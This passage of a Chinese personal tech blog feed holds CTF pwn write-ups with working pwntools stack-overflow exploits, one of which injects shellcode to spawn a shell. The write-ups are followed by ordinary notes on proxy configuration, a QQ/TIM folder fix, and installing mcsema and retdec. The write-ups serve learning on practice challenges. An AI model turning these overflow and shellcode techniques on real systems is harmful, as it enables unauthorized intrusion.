class="markdownIt-Anchor" href="#not_the_same_3dsctf_2016"></a> not_the_same_3dsctf_2016</h2><p>查看文件信息</p><p><img src="/posts/ed20bbdc/image-20221021195044103.png" alt="image-20221021195044103"></p><p>ida里看代码，这里很简单，gets存在溢出</p><p><img src="/posts/ed20bbdc/image-20221021214820457.png" alt="image-20221021214820457"></p><p>同时存在一个get_secret函数，这个函数会打开flag文件，并将flag写入一个str里面，双击进去可以看见该str的地址</p><p><img src="/posts/ed20bbdc/image-20221021215302901.png" alt="image-20221021215302901"></p><p>因此很直接的思路就是溢出到这个secret函数，然后用printf将str打印出来</p><p>但是还是遇到了本地可以但是远程不行的情况</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221021</span><br><span class="hljs-attribute">from</span> os import popen<br><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> LibcSearcher import *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br><span class="hljs-attribute">context</span>(os=&#x27;linux&#x27;, arch=&#x27;i<span class="hljs-number">386</span>&#x27;, log_level=&#x27;debug&#x27;)<br><br><span class="hljs-attribute">local</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> local == <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">io</span> = process(&#x27;./not_the_same_<span class="hljs-number">3</span>dsctf_<span class="hljs-number">2016</span>&#x27;)<br>    <span class="hljs-comment"># gdb.attach(io)</span><br>    <span class="hljs-comment"># time.sleep(5)</span><br>    <br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">io</span> = remote(&#x27;node<span class="hljs-number">4</span>.buuoj.cn&#x27;,<span class="hljs-number">25880</span>)<br><br><br><span class="hljs-attribute">junk</span>=b&#x27;a&#x27;*(<span class="hljs-number">0</span>x<span class="hljs-number">2</span>d)<br><span class="hljs-attribute">get_secret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">080489</span>A<span class="hljs-number">0</span><br><span class="hljs-attribute">printf_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">080489</span>EA   # call printf地址，所以不用多加一个ret地址<br><span class="hljs-attribute">str_flag</span> = <span class="hljs-number">0</span>x<span class="hljs-number">080</span>ECA<span class="hljs-number">2</span>D <br><br><span class="hljs-attribute">payload</span>= junk + p<span class="hljs-number">32</span>(get_secret) + p<span class="hljs-number">32</span>(printf_addr) + p<span class="hljs-number">32</span>(str_flag) <br><br><span class="hljs-attribute">io</span>.sendline(payload)<br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></div></td></tr></table></figure><p>应该还是和前面有一题一样的情况，栈不平衡导致程序异常退出，而printf函数是将输出先放在缓冲区里，程序正常退出后才会显示，所以我们需要用一个exit函数来使得程序正常退出。</p><p>还有一个改动是printf地址变了，变成了其实际的地址，而不是call printf，因为这样就可以人工设置一个返回地址来让printf函数返回，call的话会自动将返回地址压栈。</p><p>这里就将这个返回地址设置为exit函数的地址即可。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221021</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)<br>    <span class="hljs-comment"># gdb.attach(io)</span><br>    <span class="hljs-comment"># time.sleep(5)</span><br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25880</span>)<br><br><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x2d</span>)<br>get_secret = <span class="hljs-number">0x080489A0</span><br>printf_addr = <span class="hljs-number">0x0804F0A0</span><br>str_flag = <span class="hljs-number">0x080ECA2D</span> <br>exit_addr= <span class="hljs-number">0x0804E660</span><br>payload= junk + p32(get_secret) + p32(printf_addr) +p32(exit_addr)+ p32(str_flag) <br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="ciscn_2019_n_5"><a class="markdownIt-Anchor" href="#ciscn_2019_n_5"></a> ciscn_2019_n_5</h2><p>看下文件信息，啥也没开</p><p><img src="/posts/ed20bbdc/image-20221102174741262.png" alt="image-20221102174741262"></p><p>再看下代码，gets函数存在栈溢出，可以直接用shellcode了</p><p><img src="/posts/ed20bbdc/image-20221102174830535.png" alt="image-20221102174830535"></p><p>要注意的一点是，gets函数只有一个参数，第二个参数可以忽略，这题我一开始以为是读入数据到name后再把name里的内容拷贝到text，后来发现不行。</p><p>搜了下gets，发现第二个参数会被直接忽略了。依旧还是从终端读入数据到text里</p><p>所以需要send两次。</p><p>所以在终端读入两次</p><p>第一次在name中传入构造的shellcode</p><p>第二次将返回地址覆盖成name的地址，以便ret到这里执行shellcode。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221102</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./ciscn_2019_n_5&#x27;</span>)<br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27122</span>)<br><br><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)<br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class="hljs-number">0x0601080</span><br>io.sendlineafter(<span class="hljs-string">&quot;tell me your name\n&quot;</span>,shellcode)<br>payload = junk + shellcode<br>io.sendlineafter(<span class="hljs-string">&quot;What do you want to say to me?\n&quot;</span>,payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows,linux,wsl1,wsl2下的命令行代理配置</title>
    <link href="/posts/2cce8e81/"/>
    <url>/posts/2cce8e81/</url>
    
    <content type="html"><![CDATA[<p>在日常的命令行使用中，我们有时候需要在命令行使用代理，但是有时又不需要，因此在命令行配置两个命令来控制代理就会显得比较方便</p><ul><li>spp：应用代理环境变量</li><li>upp：取消代理环境变量</li></ul><p>但是在各个环境下的代理配置又不尽相同，每次要用到的时候还需要去查，因此笔者整理了一下常用系统下命令行代理设置方式，方便查阅。</p><h1 id="windows下powershell7命令行代理配置"><a class="markdownIt-Anchor" href="#windows下powershell7命令行代理配置"></a> Windows下powershell7命令行代理配置</h1><h2 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h2><p>Powershell中不像bash那样所有东西都是字符串，它支持对象，比如环境变量是存放在Env对象中的，添加和移除环境变量都是操作Env这个对象。</p><p>操作对象的方式（以环境变量为例）：</p><ul><li>添加/修改一个键值对：<code>Set-Item Env:http_proxy = &quot;http://127.0.0.1:1080&quot;</code></li><li>移除一个键值对：<code>Remove-Item Env:http_proxy</code></li></ul><p>通过这个我们就可以来设置代理了</p><h2 id="启动脚本位置"><a class="markdownIt-Anchor" href="#启动脚本位置"></a> 启动脚本位置</h2><p>和linux下的.bashrc、.zshrc对应，windows下的powershell也有对应的启动脚本，我们可以在这个脚本中设置代理配置。</p><p>按照微软官网的说法是脚本位置和权限是以下的对应关系</p><p><img src="/posts/2cce8e81/image-20221101211009115.png" alt="image-20221101211009115"></p><h2 id="脚本代码"><a class="markdownIt-Anchor" href="#脚本代码"></a> 脚本代码</h2><p>将下面的代码加进<code>Microsoft.PowerShell_profile.ps1</code> 中即可</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_proxy_variable</span></span> &#123;<br><span class="hljs-built_in">Set-Item</span> Env:http_proxy <span class="hljs-string">&quot;http://127.0.0.1:10809&quot;</span>  <span class="hljs-comment"># 代理地址</span><br><span class="hljs-built_in">Set-Item</span> Env:https_proxy <span class="hljs-string">&quot;http://127.0.0.1:10809&quot;</span> <span class="hljs-comment"># 代理地址</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unset_proxy_variable</span></span> &#123;<br>    <span class="hljs-built_in">Remove-Item</span> Env:http_proxy<br>    <span class="hljs-built_in">Remove-Item</span> Env:https_proxy<br>&#125;<br><br><span class="hljs-built_in">New-Alias</span> <span class="hljs-literal">-Name</span> spp <span class="hljs-literal">-Value</span> set_proxy_variable<br><span class="hljs-built_in">New-Alias</span> <span class="hljs-literal">-Name</span> upp <span class="hljs-literal">-Value</span> unset_proxy_variable<br></code></pre></div></td></tr></table></figure><h2 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h2><p>使用curl命令来测试（ping没用，因为它用的是icmp协议，http代理当然是在http层了），成功！</p><p><img src="/posts/2cce8e81/Untitled.png" alt="Untitled"></p><h1 id="windows下的cmd代理配置"><a class="markdownIt-Anchor" href="#windows下的cmd代理配置"></a> Windows下的cmd代理配置</h1><p>可以在命令行中输入如下代码设置，因为一般都用powershell了，所以cmd下的命令配置就不去设置了，有需要可自行搜索。</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 设置代理</span><br>*<span class="hljs-built_in">set</span> http_proxy=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">10809</span><br><span class="hljs-built_in">set</span> https_proxy=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">10809</span>*<br><br><span class="hljs-comment"># 设置代理</span><br>*<span class="hljs-built_in">set</span> http_proxy=<br><span class="hljs-built_in">set</span> https_proxy=*<br></code></pre></div></td></tr></table></figure><h1 id="linux下代理配置"><a class="markdownIt-Anchor" href="#linux下代理配置"></a> Linux下代理配置</h1><p>道理都和windows相同，找到启动脚本，设置代理命令，为代理命令设置别名</p><h2 id="脚本代码-2"><a class="markdownIt-Anchor" href="#脚本代码-2"></a> 脚本代码</h2><p>具体代码如下，将这段代码加入.bashrc或者.zshrc即可</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">alias spp=<span class="hljs-string">&#x27;export all_proxy=&quot;http://127.0.0.1:10809&quot;;&#x27;</span><br>alias upp=<span class="hljs-string">&#x27;unset all_proxy&#x27;</span><br></code></pre></div></td></tr></table></figure><h2 id="测试-2"><a class="markdownIt-Anchor" href="#测试-2"></a> 测试</h2><p><img src="/posts/2cce8e81/Untitled%201.png" alt="Untitled"></p><h1 id="wsl1下的代理配置"><a class="markdownIt-Anchor" href="#wsl1下的代理配置"></a> wsl1下的代理配置</h1><p>wsl1因为共用主机的网络设置，所以设置方法和linux下完全相同。</p><h1 id="wsl2下的代理配置"><a class="markdownIt-Anchor" href="#wsl2下的代理配置"></a> wsl2下的代理配置</h1><p>WSL2 基于 Hyper-V 运行，导致 Linux 子系统和 Windows 在网络上是两台各自独立的机器，从 Linux 子系统访问 Windows 首先需要找到 Windows 的 IP。</p><p>因此我们在wsl2上的代理设置可以采用局域网代理共享的方式。</p><p>两个关键步骤：</p><ol><li>WSL2 中配置的代理要指向 Windows 的 IP；</li><li>Windows 上的代理客户端需要允许来自本地局域网的请求；</li></ol><h2 id="windows端设置"><a class="markdownIt-Anchor" href="#windows端设置"></a> windows端设置</h2><p>v2rayN打开下面的的选项</p><p><img src="/posts/2cce8e81/Untitled%202.png" alt="Untitled"></p><p>然后再记录一下这里的端口号，后面会用到</p><p><img src="/posts/2cce8e81/Untitled%203.png" alt="Untitled"></p><h2 id="wsl端设置"><a class="markdownIt-Anchor" href="#wsl端设置"></a> wsl端设置</h2><p>将下面的代码保存在<sub>/.zshrc（如果是bash，则是</sub>/.bashrc）中。如果 不想每次手动打开命令行的代理配置，将下面的alias部分去掉，直接export即可</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">## 获取主机 IP</span><br><span class="hljs-comment">## 主机 IP 保存在 /etc/resolv.conf 中</span><br><span class="hljs-built_in">export</span> hostip=$(cat /etc/resolv.conf |grep -oP <span class="hljs-string">&#x27;(?&lt;=nameserver\ ).*&#x27;</span>)<br><span class="hljs-built_in">alias</span> spp=<span class="hljs-string">&#x27;export all_proxy=&quot;http://$&#123;hostip&#125;:10809&quot;;&#x27;</span><br><span class="hljs-built_in">alias</span> upp=<span class="hljs-string">&#x27;unset all_proxy&#x27;</span><br></code></pre></div></td></tr></table></figure><h2 id="测试-3"><a class="markdownIt-Anchor" href="#测试-3"></a> 测试</h2><p>使用curl命令验证，设置成功！</p><p><img src="/posts/2cce8e81/Untitled%204.png" alt="Untitled"></p>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Install and Configue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Configue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QQ和TIM版无法修改个人文件夹位置的解决方法</title>
    <link href="/posts/722e4585/"/>
    <url>/posts/722e4585/</url>
    
    <content type="html"><![CDATA[<ol><li>打开轻聊版/TIM设置界面，找到个人文件夹设置的地方，点击“打开个人文件夹”按钮，会打开当前的个人文件夹，完全退出轻聊版/TIM。</li><li>到个人文件夹的上一层目录，把里面的QQ号码文件夹和All Users文件夹移动或复制到新的个人文件夹位置，比如D:\MyQQData目录下。</li><li>进入&quot;C:\Users\Public\Documents\Tencent\QQ&quot;目录（如果没有这个目录，请自行创建），在该目录下右键新建文本文件，并重命名为“UserDataInfo.ini”</li><li>双击打开“UserDataInfo.ini”文件，将下列内容复制粘贴进去，UserDataSavePath=D:\MyQQData 这里就是指定新的个人文件夹位置，保存并关闭。</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">[UserDataImportSet]<br>NeedImport=<span class="hljs-number">0</span><br>OldVersion=<br>OldVerDataPathType=<br>OldVerDataPath=<br>OldQQInstallPath=D:\program_files\Tencent\TIM<br>[UserDataSet]<br>UserDataSavePathType=<span class="hljs-number">2</span><br>UserDataSavePath=G:\AppData\Tencent Files<br>NewVersion=<br></code></pre></div></td></tr></table></figure><ol><li>重新启动轻聊版/TIM，打开配置界面，看到修改已经生效了。</li></ol><p>原文链接：<a href="https://blog.csdn.net/cuixiping/article/details/71601765">https://blog.csdn.net/cuixiping/article/details/71601765</a></p>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Debug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Debug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mcsema安装使用</title>
    <link href="/posts/6b606cfe/"/>
    <url>/posts/6b606cfe/</url>
    
    <content type="html"><![CDATA[<p>McSema是一个可执行的提升器。它将可执行二进制文件从本机机器代码转换（“提升”）到LLVM位码。LLVM 位码是程序的<a href="https://en.wikipedia.org/wiki/Intermediate_representation">中间表示</a><br>形式</p><p>McSema 支持提升 Linux （ELF） 和 Windows （PE） 可执行文件，并理解大多数 x86 和 amd64 指令，包括整数、X87、MMX、SSE 和 AVX 操作。AARCH64 （ARMv8） 指令支持正在积极开发中。</p><p>使用 McSema 的过程分为两个步骤：<strong>控制流恢复</strong>和<strong>指令转换</strong>。</p><ul><li>控制流恢复依靠 IDA Pro 来反汇编二进制文件并生成控制流图。</li><li>然后使用remill库执行指令转换，该工具将控制流图转换为LLVM位码。</li></ul><ol><li>创建<strong>virtualenv</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mkdir mcsema-ve<br>virtualenv mcsema-ve<br><span class="hljs-built_in">cd</span> mcsema-ve<br><span class="hljs-built_in">source</span> bin/activate<br></code></pre></div></td></tr></table></figure><ol><li>下载仓库</li></ol><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/lifting-bits/remill.git<br><span class="hljs-built_in">pushd</span> .<br><span class="hljs-built_in">cd</span> remill<br><span class="hljs-comment"># For LLVM versions (&lt;=11)</span><br>git checkout -b all_llvm 9006baf7db<br><br><span class="hljs-built_in">popd</span><br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --depth 1 --single-branch --branch master https://github.com/lifting-bits/mcsema.git<br><br><span class="hljs-comment"># Get a compatible anvill version</span><br>git <span class="hljs-built_in">clone</span> --branch master https://github.com/lifting-bits/anvill.git<br>( <span class="hljs-built_in">cd</span> anvill &amp;&amp; git checkout -b release_bc3183b bc3183b )<br><br><span class="hljs-built_in">export</span> CC=<span class="hljs-string">&quot;<span class="hljs-subst">$(which clang)</span>&quot;</span><span class="hljs-built_in">export</span> CXX=<span class="hljs-string">&quot;<span class="hljs-subst">$(which clang++)</span>&quot;</span><span class="hljs-comment"># Download cxx-common, build Remill.</span><br>./remill/scripts/build.sh --llvm-version 11 --download-dir ./<br><span class="hljs-built_in">pushd</span> remill-build<br>sudo cmake --build . --target install<br><span class="hljs-built_in">popd</span><br><br><span class="hljs-comment"># Build and install Anvill</span><br>mkdir anvill-build<br><span class="hljs-built_in">pushd</span> anvill-build<br><span class="hljs-comment"># Set VCPKG_ROOT to whatever directory the remill script downloaded</span><br><span class="hljs-comment">#自己加了-DCMAKE_CXX_COMPILER=clang++这个参数，指定了编译器，不然会遇到如下报错</span><br>cmake -DVCPKG_ROOT=$(<span class="hljs-built_in">pwd</span>)/../vcpkg_ubuntu-20.04_llvm-11_amd64  -DCMAKE_CXX_COMPILER=clang++ ../anvill<br>sudo cmake --build . --target install<br><span class="hljs-built_in">popd</span><br><br><span class="hljs-comment"># Build and install McSema</span><br>mkdir mcsema-build<br><span class="hljs-built_in">pushd</span> mcsema-build<br><span class="hljs-comment"># Set VCPKG_ROOT to whatever directory the remill script downloaded</span><br><span class="hljs-comment">#两个地方都加</span><br>cmake -DVCPKG_ROOT=$(<span class="hljs-built_in">pwd</span>)/../vcpkg_ubuntu-20.04_llvm-11_amd64 -DCMAKE_CXX_COMPILER=clang++ ../mcsema<br>sudo cmake --build . --target install<br></code></pre></div></td></tr></table></figure><ul><li><p>报错</p><p><img src="/posts/6b606cfe/Untitled.png" alt="Untitled"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Install and Configue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>install</tag>
      
      <tag>LLVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>retdec安装使用</title>
    <link href="/posts/38fab66/"/>
    <url>/posts/38fab66/</url>
    
    <content type="html"><![CDATA[<h1 id="安装linux"><a class="markdownIt-Anchor" href="#安装linux"></a> 安装(Linux)</h1><h2 id="环境要求"><a class="markdownIt-Anchor" href="#环境要求"></a> 环境要求</h2><ul><li><code>sudo apt-get install build-essential cmake git openssl libssl-dev python3 autoconf automake libtool pkg-config m4 zlib1g-dev upx doxygen graphviz</code></li></ul><h2 id="编译安装"><a class="markdownIt-Anchor" href="#编译安装"></a> 编译安装</h2><ul><li><code>git clone https://github.com/avast/retdec</code></li><li><code>cd retdec</code></li><li><code>mkdir build &amp;&amp; cd build</code></li><li><code>cmake .. -DCMAKE_INSTALL_PREFIX=/usr/local/retdec</code>(单独指定一个目录，不要使用默认的安装目录)</li><li><code>make -jN</code> (<code>N</code> 多核编译)</li><li><code>make install</code></li></ul><h1 id="使用入门"><a class="markdownIt-Anchor" href="#使用入门"></a> 使用入门</h1><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>拿hello world试一下</p><ul><li><code>gcc test.c</code></li><li><code>/usr/local/retdec/bin/retdec-decompiler a.out</code></li></ul><p>可以看到产生了如下文件</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span>                                                                                     <br>a.out  a.out.bc  a.out.c  a.out.config.json  a.out.dsm  a.out.ll  test.c<br></code></pre></div></td></tr></table></figure><ul><li><p><code>input.exe.dsm</code></p><p>：以作者自定义格式反汇编输出。指令助记符采用默认的顶点格式。</p></li><li><p><code>input.exe.bc</code></p><p>：核心<em>反编译</em>部分的最终产品，采用 LLVM bitcode格式。</p></li><li><p><code>input.exe.ll</code></p><p>：以 LLVM IR 格式对 LLVM bitcocde进行人类可读的反汇编。</p></li><li><p><code>input.exe.config.json</code></p><p>：反编译过程生成的元数据。</p></li><li><p><code>input.exe.c</code></p><p>：反编译的 C 代码。<strong>这是主要输出。</strong></p></li></ul><p>RetDec 可以分为三个阶段：</p><ul><li>预处理阶段：首先检查文件类型是否为可执行文件，然后调用 <code>fileinfo</code> 获取文件信息生成 <code>a.out.c.json</code>，然后调用 <code>unpacker</code> 查壳和脱壳等操作</li><li>核心阶段：接下来才是重头戏，调用 <code>bin2llvmir</code> 将二进制文件转换成 LLVM IR，并输出 <code>a.out.c.frontend.dsm</code>、<code>a.out.c.backend.ll</code> 和 <code>a.out.c.backend.bc</code></li><li>后端阶段：这个阶段通过一系列代码优化和生成等操作，将 LLVM IR 反编译成 C 代码 <code>a.out.c</code>，还有 CFG 等。</li></ul><p>整个过程的结构如下：</p><p><img src="/posts/38fab66/Untitled.png" alt="Untitled"></p><p>还有很多其他功能，比如：</p><p>为每个函数单独生成CFG图（.dot格式）</p><ul><li><code>/usr/local/retdec/bin/retdec-decompiler --backend-emit-cfg a.out</code></li></ul><p>-h查看帮助</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> /usr/local/retdec/bin/retdec<span class="hljs-literal">-decompiler</span> <span class="hljs-literal">-h</span>                                             <br>/usr/local/retdec/bin/retdec<span class="hljs-literal">-decompiler</span>:<br>Mandatory arguments:<br>INPUT_FILE File to decompile.<br>General arguments:<br>[-<span class="hljs-type">o</span>|--<span class="hljs-type">output</span> <span class="hljs-type">FILE</span>] Output file (default: INPUT_FILE.c <span 